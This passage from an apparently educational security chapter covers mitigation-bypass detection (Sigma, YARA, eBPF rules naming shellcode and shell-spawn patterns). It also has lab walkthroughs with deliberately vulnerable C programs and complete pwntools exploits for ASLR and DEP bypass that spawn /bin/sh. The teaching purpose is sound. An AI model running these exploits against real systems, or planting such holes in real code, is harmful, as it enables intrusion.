**Stage 5: Sandbox escape (if applicable).** In sandboxed environments (browser, container), a second exploit chain targets the sandbox boundary (kernel vulnerability, broker process vulnerability, IPC deserialization bug).

Each stage requires the previous stage's output. Defending at any stage breaks the chain — but the attacker may find alternative paths at each stage. The defender's strategy is to make every stage as expensive as possible and to detect attempts at the earliest possible stage (Stage 1 info leaks are often the most detectable, as they involve anomalous memory reads).

### 8.4 Quantifying mitigation impact

Security researchers have estimated the impact of individual mitigations on exploit development cost in terms of additional engineering time:

| Mitigation | Additional Exploit Dev Time (estimated) | Basis |
|------------|----------------------------------------|-------|
| ASLR (no leak available) | days–weeks (finding a leak) | Industry consensus |
| DEP/NX (no ROP gadgets available) | days (building ROP chain) | ROP chain construction is largely automated by tools |
| Full RELRO (no hooks available) | hours–days (finding alternative targets) | Shift from `__malloc_hook` to FSOP added ~1 day to CTF exploit dev |
| Fine-grained CFI | days–weeks (COOP chain construction) | Schuster et al. 2015 needed ~2 weeks for Firefox COOP chain |
| CET shadow stack | unknown (no public bypass chains in production) | Theoretical only; JOP alternative is available |
| ARM MTE (sync mode) | significant (deterministic tag checks) | Probabilistic (16 tags) but adds reliable detection |

These estimates are from offensive security community assessments and academic publications. They represent the incremental cost for an experienced exploit developer who already has the prerequisite primitives for the previous stages.

### 8.5 Emerging mitigations

**ARM MTE (Memory Tagging Extension).** Assigns a 4-bit tag to each 16-byte granule of memory. Pointers carry a tag in their top bits. On memory access, the hardware checks that the pointer's tag matches the memory's tag. A mismatch raises a fault (synchronous mode) or is logged (asynchronous mode). MTE probabilistically detects use-after-free (the freed memory gets a new random tag) and out-of-bounds access (adjacent allocations have different tags). The probability of a random tag match is 1/16 (6.25%) per attempt — not deterministic, but across multiple corruptions in a typical exploit chain, the probability of evading all checks drops exponentially.

**Intel CET (Control-flow Enforcement Technology).** Combines shadow stacks (backward-edge) and IBT (forward-edge). Deployed in Windows 11 and Linux 6.6+. Shadow stacks are hardware-enforced via a dedicated stack page type that normal stores cannot write to. IBT requires all indirect branch targets to begin with `ENDBR`. As discussed in §7, CET raises the bar significantly but does not eliminate all code-reuse attacks.

**Kernel CFI.** LLVM CFI compiled into the Linux kernel (since Linux 5.13 with `CONFIG_CFI_CLANG`). Constrains indirect calls within the kernel to functions matching the expected prototype. This hardens the kernel against exploit chains that use corrupted function pointers (e.g., overwriting `ops->ioctl` in a kernel structure). Combined with KASLR and KPTI, kernel CFI significantly increases the cost of kernel exploitation.

**Software-based shadow stacks (GCC `-mshstk`, Clang Safe Stack).** For platforms without hardware CET, software shadow stacks provide backward-edge protection at a performance cost (5-10% overhead typical). Safe Stack (Clang) separates the stack into a "safe stack" (return addresses, spill slots) and an "unsafe stack" (buffers, arrays). Overflows on the unsafe stack cannot reach return addresses on the safe stack.

**Control Flow Guard (CFG) and eXtended Flow Guard (XFG) on Windows.** CFG validates indirect call targets against a bitmap of valid targets. XFG extends CFG with type-hash matching, reducing the valid target set per call site. XFG is deployed in Windows 11 and Edge. While coarser than LLVM CFI, XFG provides meaningful forward-edge protection on Windows where LLVM CFI is not available.

---

## 9. Detection engineering for exploitation attempts

The bypass techniques catalogued in §1–§8 leave forensic and runtime artifacts that detection engineers can instrument. This section provides concrete detection rules — Sigma for SIEM correlation, YARA for static/memory scanning, and runtime hooks via eBPF and hardware trace — focused on the userspace and general-purpose exploitation indicators. Kernel-specific detection (LKRG, cred structure monitoring, PatchGuard internals) is covered in the companion chapter (Domain 6B §Detection).

### 9.1 Sigma rules for mitigation bypass indicators

The following rules are custom detection logic targeting the observable consequences of the exploitation techniques described earlier. They are written in Sigma syntax for portability across SIEM backends (Splunk, Elastic, Microsoft Sentinel). Each rule identifies the exploitation stage it targets and the section of this chapter where the underlying technique is documented.

**Rule 1 — RWX memory allocation in non-JIT processes.** When an attacker's ROP chain calls `mprotect` or `mmap` with `PROT_READ|PROT_WRITE|PROT_EXEC` (§2.1, §2.2), the resulting W+X transition is observable through audit logs or syscall tracing. Legitimate JIT engines (V8, HotSpot, .NET) create RWX pages as part of normal operation, so the rule excludes known JIT process names.

```yaml
title: RWX Memory Allocation in Non-JIT Process
status: experimental
description: >
  Detects mprotect or mmap calls that create memory regions with simultaneous
  write and execute permissions outside of known JIT engine processes. This
  pattern is consistent with DEP bypass via ROP chain (§2.1, §2.2).
logsource:
  product: linux
  service: auditd
detection:
  selection_mprotect:
    syscall: 'mprotect'
    a2|contains: '7'   # PROT_READ|PROT_WRITE|PROT_EXEC
  selection_mmap:
    syscall: 'mmap'
    a2|contains: '7'
  filter_jit:
    exe|endswith:
      - '/chrome'
      - '/firefox'
      - '/java'
      - '/node'
      - '/dotnet'
      - '/qemu-system-x86_64'
  condition: (selection_mprotect or selection_mmap) and not filter_jit
level: high
tags:
  - attack.defense_evasion
  - attack.t1055
falsepositives:
  - Custom JIT applications not in the exclusion list
  - Dynamic code generation in interpreters (Python cffi, Ruby FFI)
```

**Rule 2 — Stack pivot detection via mprotect on stack-adjacent memory.** A stack pivot (used in ROP chains to redirect `rsp` to attacker-controlled memory) often follows a pattern where `mprotect` is called on an address near the thread's stack. The audit trail shows `mprotect` with the target address within the thread's stack VMA range but with permissions that include `PROT_EXEC`, which is never legitimate for stack memory.

```yaml
title: mprotect PROT_EXEC on Stack Region
status: experimental
description: >
  Detects mprotect calls that add execute permission to memory within the
  process stack region. Legitimate programs never make the stack executable
  unless compiled with -z execstack. Indicates ROP-to-shellcode pivot (§2.1).
logsource:
  product: linux
  service: auditd
detection:
  selection:
    syscall: 'mprotect'
    a2|contains: '7'
  filter_execstack:
    exe|endswith:
      - '/gcc'
      - '/ld'
  condition: selection and not filter_execstack
level: critical
tags:
  - attack.execution
  - attack.t1203
falsepositives:
  - Legacy programs using GCC nested functions (trampoline on stack)
```

**Rule 3 — Heap spray detection via large anonymous mmap allocations.** Heap spraying (cross-reference Domain 3, Chapter 3B) creates many large, similarly-sized memory regions to place controlled data (NOP sleds, fake objects, vtable pointers) at predictable addresses. The audit trail shows a rapid sequence of `mmap` calls with `MAP_ANONYMOUS`, each requesting the same large size (typically 1 MB aligned).

```yaml
title: Potential Heap Spray via Repeated Large Anonymous Allocations
status: experimental
description: >
  Detects a burst of large, identically-sized anonymous memory allocations
  within a short window, consistent with heap spray preparation for
  exploitation. Common in browser exploits and JIT spray setups (§2.6).
logsource:
  product: linux
  service: auditd
detection:
  selection:
    syscall: 'mmap'
    a3|contains: '22'   # MAP_ANONYMOUS | MAP_PRIVATE
    a1|gt: 1048576       # size > 1MB
  timeframe: 5s
  condition: selection | count(exe) by exe > 20
level: medium
tags:
  - attack.execution
  - attack.t1059
falsepositives:
  - Database engines allocating buffer pools
  - Multimedia applications allocating frame buffers
```

**Rule 4 — Fork brute-force canary bypass.** When an attacker brute-forces a stack canary against a fork-without-exec server (§3.2), the process produces a distinctive pattern: rapid child-process crashes (SIGABRT from `__stack_chk_fail`) followed by immediate respawns from the same parent. The crash-to-respawn cycle occurs hundreds of times in sequence.

```yaml
title: Fork Server Canary Brute-Force Pattern
status: experimental
description: >
  Detects rapid child-process crash-respawn cycles from the same parent,
  consistent with byte-by-byte stack canary brute-forcing against a
  forking network service (§3.2). Expects 200+ crashes in under 5 minutes.
logsource:
  product: linux
  service: syslog
detection:
  selection:
    message|contains: '__stack_chk_fail'
  timeframe: 5m
  condition: selection | count() by ppid > 200
level: high
tags:
  - attack.credential_access
  - attack.t1110
falsepositives:
  - Fuzzing campaigns against forking services (expected in test environments)
```

**Rule 5 — Unusual /proc/self/maps access patterns.** An attacker exploiting an SSRF or file-read vulnerability to leak ASLR layout (§1.6) reads `/proc/self/maps` or `/proc/PID/maps` through the vulnerable application. Web applications and network daemons rarely read their own maps file during normal operation.

```yaml
title: Process Reading Own /proc/self/maps
status: experimental
description: >
  Detects a network-facing process reading /proc/self/maps, which may
  indicate ASLR information leak exploitation (§1.6). Most web applications
  and network daemons have no legitimate reason to read this file.
logsource:
  product: linux
  service: auditd
detection:
  selection:
    syscall: 'openat'
    a1|contains: '/proc/self/maps'
  filter_legitimate:
    exe|endswith:
      - '/gdb'
      - '/strace'
      - '/valgrind'
      - '/perf'
  condition: selection and not filter_legitimate
level: medium
tags:
  - attack.discovery
  - attack.t1057
falsepositives:
  - Crash reporters and telemetry agents reading maps for symbolication
  - Address sanitizer runtime reading maps for shadow memory setup
```

**Rule 6 — JIT spray indicators via repeated similar compilations.** JIT spray attacks (§2.6) submit many nearly-identical JavaScript (or equivalent) expressions that compile to controlled byte sequences. The JIT engine's telemetry may show repeated compilation of structurally similar functions with abnormally high immediate-value density.

```yaml
title: JIT Compilation Anomaly - Repeated Similar Function Compilation
status: experimental
description: >
  Detects an anomalous burst of JIT compilation events where the compiled
  functions have similar structure, consistent with JIT spray preparation
  (§2.6). Requires JIT engine telemetry (V8 --trace-opt, SpiderMonkey
  JIT logging).
logsource:
  product: browser
  service: jit_telemetry
detection:
  selection:
    event_type: 'jit_compile'
  timeframe: 10s
  condition: selection | count() by tab_id > 500
level: medium
tags:
  - attack.execution
  - attack.t1059.007
falsepositives:
  - Legitimate heavy computation (WebAssembly compilation, shader compilation)
```

**Rule 7 — Privilege escalation after unusual syscall burst.** A kernel exploit (or a userspace exploit that achieves privilege escalation via `execve` of a SUID binary) produces a detectable pattern: a process that executes an unusual sequence of syscalls (many `mmap`/`mprotect`/`ioctl` in rapid succession) and then transitions to UID 0 or gains capabilities it did not previously hold.

```yaml
title: Privilege Escalation After Syscall Burst
status: experimental
description: >
  Correlates a burst of unusual syscalls (mprotect, mmap, ioctl, sendmsg)
  from an unprivileged process followed by a privilege transition (UID
  change to 0 or capability acquisition). Indicates successful exploitation.
logsource:
  product: linux
  service: auditd
detection:
  syscall_burst:
    syscall|contains:
      - 'mprotect'
      - 'mmap'
      - 'ioctl'
      - 'sendmsg'
    auid|gt: 1000
  priv_change:
    syscall: 'setuid'
    a0: '0'
  timeframe: 30s
  condition: syscall_burst | count() by pid > 50 | temporal priv_change
level: critical
tags:
  - attack.privilege_escalation
  - attack.t1068
falsepositives:
  - Legitimate setuid helpers invoked after heavy I/O (rare)
```

**Rule 8 — Format string exploitation indicators.** Format string attacks (§1.2, cross-reference Domain 3, Chapter 3A §5) often produce observable artifacts: stack content appearing in log output, `%n`-driven writes causing unexpected syslog entries with pointer-like values, or crashes in `vfprintf` family functions. If the application logs user-controlled strings through `syslog` or similar, format specifiers in the output indicate exploitation.

```yaml
title: Format String Exploitation Artifact in Syslog
status: experimental
description: >
  Detects syslog messages containing sequences characteristic of format
  string exploitation: hexadecimal pointer values (0x7f...) in application
  output that should contain only human-readable text. Indicates §1.2
  information leak or §3.1 canary leak via format string.
logsource:
  product: linux
  service: syslog
detection:
  selection:
    message|re: '0x7f[0-9a-f]{10,12}'
  filter_known:
    facility|contains:
      - 'kern'
      - 'debug'
  condition: selection and not filter_known
level: medium
tags:
  - attack.initial_access
  - attack.t1190
falsepositives:
  - Debug-level logging that intentionally prints pointer values
```

### 9.2 YARA rules for exploitation artifacts

YARA rules scan process memory, crash dumps, or network captures for byte patterns associated with exploitation. The following rules target the artifacts produced by the techniques in §1–§5. These are illustrative signatures — production deployment requires tuning the patterns to the specific target environment and binary versions.

**ROP gadget chain signatures.** A ROP chain on x86_64 consists of a sequence of 8-byte addresses on the stack, each pointing to a short instruction sequence ending in `ret` (0xC3). While the addresses themselves are environment-specific, certain structural patterns recur: consecutive stack entries that point into the same library's `.text` section, with small relative offsets between them, and the pointed-to code containing specific byte sequences (`5f c3` for `pop rdi; ret`, `5e c3` for `pop rsi; ret`, `5a c3` for `pop rdx; ret`).

```
rule ROP_Gadget_Chain_x86_64
{
    meta:
        description = "Detects potential ROP gadget chain patterns in memory"
        reference = "Domain 6 §2 DEP/NX bypass via ROP"
        severity = "high"

    strings:
        // Common x86_64 ROP gadgets (little-endian byte sequences)
        $pop_rdi_ret = { 5f c3 }                      // pop rdi; ret
        $pop_rsi_ret = { 5e c3 }                      // pop rsi; ret
        $pop_rdx_ret = { 5a c3 }                      // pop rdx; ret
        $pop_rax_ret = { 58 c3 }                      // pop rax; ret
        $syscall_ret = { 0f 05 c3 }                   // syscall; ret
        $pop_rcx_ret = { 59 c3 }                      // pop rcx; ret
        $pop_r8_ret  = { 41 58 c3 }                   // pop r8; ret
        $leave_ret   = { c9 c3 }                      // leave; ret (stack pivot)

    condition:
        // At least 4 different gadget types in close proximity suggests a chain
        4 of ($pop_rdi_ret, $pop_rsi_ret, $pop_rdx_ret, $pop_rax_ret,
               $syscall_ret, $pop_rcx_ret, $pop_r8_ret, $leave_ret)
        and filesize < 100MB
}
```

**Shellcode patterns.** Classic shellcode artifacts include NOP sleds (sequences of `0x90` on x86, or equivalent multi-byte NOPs), egg-hunter preamble sequences, and staged payload markers. The following rule detects common shellcode structures in memory dumps or network captures.

```
rule Shellcode_Artifacts_x86_64
{
    meta:
        description = "Detects common x86_64 shellcode patterns in memory or captures"
        reference = "Domain 6 §2 DEP bypass, §2.6 JIT spray"
        severity = "critical"

    strings:
        // NOP sled variants
        $nop_classic  = { 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 }
        $nop_multibyte = { 66 90 66 90 66 90 66 90 }  // 2-byte NOP sled

        // execve("/bin/sh") syscall setup (common in CTF/exploit shellcode)
        $execve_setup = { 48 31 f6 48 31 d2 48 bb 2f 62 69 6e 2f 73 68 00 }
        // xor rsi,rsi; xor rdx,rdx; mov rbx, "/bin/sh\0"

        // mprotect syscall (number 10 on x86_64)
        $mprotect_syscall = { 48 c7 c0 0a 00 00 00 0f 05 }
        // mov rax, 10; syscall

        // Egg hunter marker (common pattern: 8-byte repeated marker)
        $egg_hunter = { 8b ?? 66 81 ?? ?? ?? 74 }

    condition:
        any of ($nop_classic, $nop_multibyte) or
        any of ($execve_setup, $mprotect_syscall) or
        $egg_hunter
}
```

**Exploit framework signatures.** Exploitation frameworks like pwntools and Metasploit produce recognizable patterns in their output. Pwntools-generated payloads often include the cyclic pattern (`aaaabaaacaaadaaa...`) used for offset discovery, and Metasploit's msfvenom shellcode uses specific encoder stubs (e.g., the Shikata Ga Nai polymorphic XOR encoder begins with `\xda\xd0` or `\xd9\x74\x24\xf4`).

```
rule Exploit_Framework_Signatures
{
    meta:
        description = "Detects pwntools cyclic patterns and msfvenom encoder stubs"
        reference = "Domain 6 — exploitation tooling artifacts"
        severity = "high"

    strings:
        // pwntools cyclic pattern (De Bruijn sequence starting bytes)
        $pwntools_cyclic = "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaam"

        // Metasploit Shikata Ga Nai encoder stub variations
        $sgn_stub_1 = { d9 74 24 f4 }         // fnstenv [esp-12]
        $sgn_stub_2 = { da d0 d9 74 24 f4 }   // fcmovbe st(0); fnstenv

        // Metasploit x64 XOR encoder
        $msf_xor64 = { 48 31 c9 48 81 e9 }    // xor rcx,rcx; sub rcx, <block count>

    condition:
        any of them
}
```

**Heap spray artifacts.** A heap spray fills memory with repeated copies of a payload (often NOP sled + shellcode or fake vtable structures). In process memory, this manifests as large contiguous regions containing the same repeating pattern. The following rule detects the structural signature of a spray rather than a specific payload.

```
rule Heap_Spray_Pattern
{
    meta:
        description = "Detects repeating patterns in large memory regions consistent with heap spray"
        reference = "Domain 6 §2.6, Domain 3 heap exploitation"
        severity = "high"

    strings:
        // Common spray alignment addresses used as fake vtable pointers
        // These are target-dependent; the following are illustrative
        $spray_marker_1 = { 41 41 41 41 41 41 41 41 }  // 0x4141414141414141
        $spray_marker_2 = { 0a 0a 0a 0a 0a 0a 0a 0a }  // 0x0a0a0a0a0a0a0a0a
        // Repeated heap address pattern (common in tcache poisoning)
        $spray_heap_ptr = { 55 55 00 00 00 00 }          // partial heap address

    condition:
        for any of them : ( # > 1000 )  // same pattern repeated >1000 times
}
```

### 9.3 Runtime detection mechanisms

Beyond log-based Sigma rules and file-based YARA scans, runtime detection uses hardware features and kernel-level tracing to observe exploitation as it happens.

**Intel Processor Trace (Intel PT) for CFI violation detection.** Intel PT records a compressed branch trace of all executed control flow transitions. By decoding the PT trace and comparing it against the program's expected control flow graph (CFG), a monitor can detect CFI violations — indirect branches to unexpected targets, return addresses that do not match the call site, and execution in regions that should not be reachable. Intel PT operates at hardware speed with approximately 5-15% performance overhead, making it viable for production monitoring of high-value services.

Configuring Intel PT for exploit detection on Linux requires the `perf` subsystem. The following enables PT collection for a specific process and decodes the trace with `perf script`:

```bash
# Enable Intel PT for a target process (requires perf_event_paranoid <= 1)
perf record -e intel_pt//u -p $TARGET_PID -- sleep 60

# Decode the trace and look for unexpected control flow
perf script --itrace=crb | grep -E 'call|ret|jmp' > /tmp/pt_trace.txt

# Analyze: compare branch targets against known-good CFG
# A production system would use a dedicated decoder (libipt) and CFG database
```

For automated CFI monitoring, the `perf` infrastructure can be combined with Griffin (a research tool from Georgia Tech) or Intel's own PT analysis framework. Griffin decodes the PT trace stream in real-time, compares each indirect branch target against a precomputed CFG, and raises an alert on any deviation. The detection latency is on the order of milliseconds — fast enough to terminate an exploit in progress, though the exploit's initial corruption has already occurred.

**ARM Branch Target Identification (BTI) violation monitoring.** On AArch64 systems with BTI enabled (`-mbranch-protection=bti` at compile time), the hardware raises a `SIGILL` (illegal instruction) when an indirect branch lands on an instruction that is not a `BTI` landing pad. This signal can be caught by a monitoring process or logged via the audit subsystem. BTI violations in production indicate either a CFI bypass attempt or a bug in a JIT engine that fails to emit BTI instructions.

```bash
# Compile with BTI enabled on AArch64
aarch64-linux-gnu-gcc -mbranch-protection=bti -o target target.c

# Monitor BTI violations via signal handler or audit
# In auditd, BTI violations appear as SIGILL with si_code = ILL_ILLOPC
# at addresses that are not BTI landing pads
```

**eBPF-based exploit detection.** eBPF programs attached to tracepoints and kprobes can observe syscall arguments in real-time, enabling detection of exploitation patterns without the overhead of full auditd logging. The following eBPF approach monitors `mprotect` calls for W+X transitions:

```c
// eBPF program attached to sys_enter_mprotect tracepoint
// Filters for PROT_WRITE | PROT_EXEC transitions from non-JIT processes

SEC("tracepoint/syscalls/sys_enter_mprotect")
int detect_rwx_mprotect(struct trace_event_raw_sys_enter *ctx) {
    unsigned long prot = ctx->args[2];

    // Check for PROT_WRITE | PROT_EXEC (bits 2 and 4)
    if ((prot & 0x6) == 0x6) {  // PROT_WRITE=2, PROT_EXEC=4; combined=6
        u32 pid = bpf_get_current_pid_tgid() >> 32;
        char comm[16];
        bpf_get_current_comm(&comm, sizeof(comm));

        // Emit event to userspace for SIEM ingestion
        struct exploit_event evt = {
            .pid = pid,
            .prot = prot,
            .addr = ctx->args[0],
            .size = ctx->args[1],
        };
        __builtin_memcpy(&evt.comm, &comm, 16);
        bpf_perf_event_output(ctx, &events, BPF_F_CURRENT_CPU,
                              &evt, sizeof(evt));
    }
    return 0;
}
```

This eBPF program has negligible performance impact (sub-microsecond per syscall) because it executes in the kernel and filters at the source, avoiding the overhead of generating audit records for every syscall and filtering in userspace.

**Windows ETW providers for exploitation detection.** On Windows, the `Microsoft-Windows-Security-Mitigations` ETW provider logs events when process mitigations are triggered. Events include:
- CFG violations (event ID 12): an indirect call targeted an address not in the CFG bitmap.
- DEP violations (event ID 8): an attempt to execute from a non-executable page.
- ACG enforcement (event ID 16): a process attempted to allocate or modify executable memory while ACG was active.
- Stack pivot detection (event ID 20): the stack pointer moved to an unexpected region.

These events are generated by the Windows kernel when hardware or software mitigations detect a violation, making them high-confidence indicators of exploitation attempts. Collection is via `xperf`, Windows Performance Recorder, or direct ETW consumer integration.

### 9.4 SIEM correlation patterns

Individual detection signals (a single `mprotect` call, a single crash, a single pointer value in logs) are weak indicators. The following correlation patterns chain multiple signals to produce high-confidence exploitation alerts.

**Pattern 1 — ASLR leak followed by DEP bypass.** An ASLR information leak (§1.2) produces a pointer-value artifact in application output. A subsequent `mprotect` or `mmap` call with `PROT_EXEC` from the same process (§2.1, §2.2) indicates the attacker used the leak to compute addresses for a DEP bypass. Correlating a format-string artifact (Rule 8) with an RWX allocation (Rule 1) from the same process within a 60-second window produces a critical-severity alert.

**Pattern 2 — Crash storm followed by successful exploitation.** A fork brute-force (§3.2) produces many child crashes (Rule 4). After the brute-force succeeds, the attacker's subsequent connection does not crash — it instead shows anomalous behavior (shell execution, outbound connection, file access outside the application's normal profile). Correlating the crash storm with the subsequent anomalous-behavior alert from EDR or behavioral monitoring indicates completed exploitation.

**Pattern 3 — Memory corruption followed by privilege escalation.** An audit trail showing unusual syscall patterns (many `mprotect`/`mmap`/`ioctl` calls) from a process, followed by a UID transition (Rule 7), is the canonical kernel-or-SUID exploit chain. The time window between the syscall burst and the privilege change is typically under 1 second.

---

## 10. Practical exploitation lab walkthroughs

This section provides end-to-end exploitation walkthroughs that exercise the bypass techniques described in §1–§5. Each lab specifies a vulnerable program, the compilation flags that enable specific mitigations, the complete exploitation script, and the detection artifacts the attack produces. The labs are designed for controlled environments — all vulnerable programs are purpose-built and should never be deployed outside isolated lab networks.

### 10.1 Lab 1 — ASLR bypass via format string information leak

This lab demonstrates the canonical ASLR defeat workflow (§1.2): leak a libc address via format string, compute the libc base, and use a known one-gadget offset to achieve code execution.

**Vulnerable program.** The program reads user input and passes it directly to `printf` as the format string — a textbook format-string vulnerability.

```c
/* vuln_fmt_aslr.c — format string + stack overflow for ASLR bypass lab
 * Compile: gcc -o vuln_fmt_aslr vuln_fmt_aslr.c -fno-stack-protector -no-pie
 *          -Wno-format-security
 * Note: -no-pie is used to simplify the first lab. Real exploitation against
 *       PIE binaries requires leaking both PIE base and libc base. */

#include <stdio.h>
#include <string.h>
#include <unistd.h>

void vulnerable(void) {
    char buf[128];

    printf("Enter input: ");
    fflush(stdout);
    read(STDIN_FILENO, buf, 256);  /* overflow: 256 > 128 */

    printf(buf);   /* format string vulnerability */
    printf("\n");

    printf("Enter payload: ");
    fflush(stdout);
    read(STDIN_FILENO, buf, 256);  /* second read: deliver ROP/ret2libc payload */
}

int main(void) {
    vulnerable();
    return 0;
}
```

**Compilation and verification.**

```bash
gcc -o vuln_fmt_aslr vuln_fmt_aslr.c -fno-stack-protector -no-pie \
    -Wno-format-security -z norelro
checksec --file=vuln_fmt_aslr
# Expected: No canary, NX enabled, No PIE, No RELRO, ASLR on (system-wide)
```

**Exploit script.** The exploit proceeds in two stages: first, it leaks a libc address via the format string; second, it delivers a return-to-libc payload using the computed addresses.

```python
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

elf = ELF('./vuln_fmt_aslr')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')  # adjust per target

# Determine the stack offset that contains a __libc_start_main return address.
# Method: send %1$p %2$p ... %20$p and identify which offset contains a
# value in the libc .text range (0x7f...).
LIBC_RET_OFFSET = 15  # adjust per target binary and libc version

# Offset from __libc_start_main_ret to __libc_start_main symbol
# Determine via: readelf -s libc.so.6 | grep __libc_start_main
# Then add the offset of the call instruction (typically +243 on glibc 2.35)
LIBC_START_MAIN_RET_DELTA = libc.symbols['__libc_start_main'] + 243  # adjust

# One-gadget offset (determine via: one_gadget /path/to/libc.so.6)
ONE_GADGET_OFFSET = 0xe3b01  # adjust per libc build

# Buffer overflow offset to saved return address (128 bytes buffer + 8 bytes RBP)
RET_OFFSET = 128 + 8

p = process('./vuln_fmt_aslr')

# Stage 1: Leak libc address
p.recvuntil(b'Enter input: ')
p.sendline(f'%{LIBC_RET_OFFSET}$p'.encode())

leak_line = p.recvline().strip()
libc_leak = int(leak_line, 16)
log.info(f'Leaked value: {hex(libc_leak)}')

libc_base = libc_leak - LIBC_START_MAIN_RET_DELTA
log.info(f'Computed libc base: {hex(libc_base)}')

# Stage 2: Return-to-libc payload
system_addr = libc_base + libc.symbols['system']
bin_sh_addr = libc_base + next(libc.search(b'/bin/sh\x00'))

# Find gadgets in libc (offsets from ROPgadget --binary libc.so.6 | grep "pop rdi")
pop_rdi_ret = libc_base + 0x2a3e5  # adjust per libc
ret_gadget  = libc_base + 0x29139  # bare ret for alignment; adjust per libc

payload  = b'A' * RET_OFFSET
payload += p64(ret_gadget)      # 16-byte stack alignment
payload += p64(pop_rdi_ret)     # pop rdi; ret
payload += p64(bin_sh_addr)     # rdi = "/bin/sh"
payload += p64(system_addr)     # call system("/bin/sh")

p.recvuntil(b'Enter payload: ')
p.sendline(payload)

p.interactive()
```

**ASLR entropy impact.** To measure the exploit's reliability under ASLR, run it in a loop and record the success rate. With ASLR disabled (`echo 0 > /proc/sys/kernel/randomize_va_space`), the exploit succeeds 100% of the time because addresses are deterministic. With ASLR enabled, the info-leak approach succeeds 100% of the time as well — the leak defeats ASLR entirely. This demonstrates that ASLR is only effective when the attacker lacks any information-leak primitive.

**Detection artifacts.** The format string payload (`%15$p`) appears in the application's output as a hexadecimal pointer value (matching Sigma Rule 8 in §9.1). The subsequent `system("/bin/sh")` call spawns a shell, which is detectable via process-tree monitoring (a network daemon spawning `/bin/sh` is anomalous). The format string itself may appear in network captures if the service operates over a cleartext protocol.

### 10.2 Lab 2 — DEP bypass via ROP chain with mprotect

This lab isolates DEP bypass (§2.1) by disabling ASLR and canaries, leaving only NX (DEP) as the mitigation to defeat. The attacker builds a ROP chain that calls `mprotect` to make the stack executable, then jumps to shellcode on the stack.

**Compilation.**

```bash
gcc -o vuln_dep vuln_dep.c -fno-stack-protector -no-pie -z norelro -static
# -static links libc statically, providing a rich gadget corpus in the binary
checksec --file=vuln_dep
# Expected: No canary, NX enabled, No PIE, No RELRO, Partial RELRO (irrelevant for static)
echo 0 > /proc/sys/kernel/randomize_va_space  # disable ASLR for this lab
```

**Vulnerable program.** A simple stack buffer overflow.

```c
/* vuln_dep.c — stack overflow for DEP bypass lab */
#include <stdio.h>
#include <unistd.h>

void vulnerable(void) {
    char buf[64];
    read(STDIN_FILENO, buf, 512);  /* overflow: 512 > 64 */
}

int main(void) {
    vulnerable();
    return 0;
}
```

**Gadget discovery.** The attacker uses ROPgadget to find the necessary gadgets in the static binary:

```bash
ROPgadget --binary vuln_dep --ropchain
# Alternatively, search for specific gadgets:
ROPgadget --binary vuln_dep | grep "pop rdi ; ret"
ROPgadget --binary vuln_dep | grep "pop rsi ; ret"
ROPgadget --binary vuln_dep | grep "pop rdx ; ret"
ROPgadget --binary vuln_dep | grep "syscall"
```

**Exploit script using pwntools ROP.**

```python
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

elf = ELF('./vuln_dep')
rop = ROP(elf)

# Shellcode: execve("/bin/sh", NULL, NULL)
shellcode = asm(shellcraft.sh())

# The buffer is at a known stack address (ASLR disabled).
# Determine the stack address via gdb: break at read(), examine $rsp
STACK_BUF = 0x7fffffffe340  # adjust per environment

# Page-align the buffer address for mprotect
STACK_PAGE = STACK_BUF & ~0xfff

# Overflow offset: 64 bytes buffer + 8 bytes saved RBP
RET_OFFSET = 64 + 8

# Build mprotect ROP chain: mprotect(STACK_PAGE, 0x2000, 7)
rop.call('mprotect', [STACK_PAGE, 0x2000, 7])
rop.call(STACK_BUF + RET_OFFSET + len(rop.chain()) + 8)
# ^ Jump to shellcode, which follows the ROP chain on the stack

payload  = b'\x90' * 64        # NOP-fill the buffer (or use cyclic for offset finding)
payload += b'B' * 8            # overwrite saved RBP
payload += rop.chain()         # ROP chain: mprotect then jump
payload += shellcode           # shellcode follows immediately

p = process('./vuln_dep')
p.sendline(payload)
p.interactive()
```

**Comparing approaches.** The same vulnerability can be exploited three different ways:

The ROP-to-mprotect approach (shown above) calls `mprotect` to enable execution on the stack, then runs injected shellcode. It requires finding gadgets for three arguments plus a `mprotect` call. The return-to-libc approach (§2.3) avoids shellcode entirely, calling `system("/bin/sh")` via a shorter chain — but in a static binary, `system()` is available directly. The SROP approach (§2.7) uses a single `sigreturn` gadget with a forged signal frame to set all registers at once, calling `mprotect` (or `execve`) with minimal gadget requirements. SROP is the most resilient against limited gadget availability.

**Detection.** The `mprotect` call with `PROT_EXEC` on a stack page triggers Sigma Rule 1 and Rule 2 (§9.1). The shellcode on the now-executable stack matches YARA `Shellcode_Artifacts_x86_64` (§9.2). Intel PT trace analysis (§9.3) would show a `ret` instruction landing on the first ROP gadget (not a function entry point), violating the expected return-to-caller pattern.

### 10.3 Lab 3 — Heap exploitation: tcache poisoning on glibc 2.35+

This lab demonstrates a modern heap exploitation technique (cross-reference Domain 3, Chapter 3B) against glibc's tcache with safe-linking (introduced in glibc 2.32). The attacker must first leak a heap address to defeat safe-linking, then corrupt a tcache `next` pointer to achieve arbitrary-address allocation.

**Context.** Since glibc 2.34 removed `__malloc_hook` and `__free_hook`, the attacker cannot simply overwrite a hook to get code execution. Modern exploitation targets `_IO_FILE` structures (§4.2 FSOP), `__exit_funcs`, or tcache metadata to redirect control flow.

**Vulnerable program.** A use-after-free (UAF) that allows reading and writing to freed heap chunks.

```c
/* vuln_tcache.c — UAF for tcache poisoning lab
 * Compile: gcc -o vuln_tcache vuln_tcache.c -pie -fstack-protector-strong
 *          -Wl,-z,relro,-z,now
 * All mitigations enabled: PIE, full RELRO, stack protector, NX, ASLR */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define CHUNK_SIZE 0x80
struct slot { char *ptr; size_t size; };
static struct slot slots[16];

void menu(void) {
    puts("1) alloc  2) free  3) read  4) write  5) exit");
}

int main(void) {
    setbuf(stdout, NULL);
    int choice, idx;
    while (1) {
        menu();
        scanf("%d %d", &choice, &idx);
        if (idx < 0 || idx >= 16) continue;
        switch (choice) {
            case 1:
                slots[idx].ptr = malloc(CHUNK_SIZE);
                slots[idx].size = CHUNK_SIZE;
                break;
            case 2:
                free(slots[idx].ptr);
                /* BUG: does not NULL out slots[idx].ptr — UAF */
                break;
            case 3:
                write(STDOUT_FILENO, slots[idx].ptr, slots[idx].size);
                break;
            case 4:
